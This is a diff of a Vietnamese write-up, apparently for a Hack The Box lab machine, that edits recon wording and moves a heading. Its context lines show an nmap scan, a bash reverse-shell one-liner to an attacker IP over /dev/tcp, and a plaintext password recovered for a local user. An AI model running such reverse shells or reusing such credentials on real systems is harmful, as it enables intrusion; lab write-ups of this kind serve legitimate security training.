@@ -9,7 +9,7 @@
 
 # Recon
 ## nmap 
-Sau khi nmap ta thấy nó scan được **2** port ssh và http 
+Sau khi nmap ta scan được **2** port ssh và http 
 ```
 ┌──(kali㉿kali)-[~]
 └─$ sudo nmap -sS 10.10.10.185                                
@@ -125,6 +125,7 @@ Sử dụng `/bin/bash -c 'bash -i > /dev/tcp/10.10.14.93/1234 0>&1'` để có 
 
 ![image](https://hackmd.io/_uploads/SJH7ZYM5R.png)
 
+## Post-Exploit
 ### Lateral Movement 
 cd qua `home` để lấy user flag nhưng không có quyền đọc file, vì thế tiếp tục tìm xem có gì khac 
 
@@ -246,9 +247,8 @@ Password: Th3s3usW4sK1ng
 
 theseus@magic:/var/www/Magic$ whoami
 whoami
-
 ```
-## Post-Exploit
+
 ```
 theseus@magic:~$ ls
 ls
